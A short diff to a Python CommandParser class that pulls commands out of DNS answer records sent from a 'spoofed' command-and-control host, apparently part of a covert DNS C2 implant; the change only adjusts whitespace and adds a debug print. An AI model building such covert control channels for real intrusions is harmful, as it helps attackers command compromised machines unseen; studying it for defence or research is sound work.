@@ -13,11 +13,13 @@ class CommandParser:
         an = response['DNS'].an
         if an == None:
             return None
-            
+
         if an.type != PACKET_OPTIONS['DNS']['AN']['TYPE']:
             return None
 
         if an.qname != CC_SERVER_SPOOFED_HOST:
             return None
+
+        print("parsed command")
         
         return an.rdata
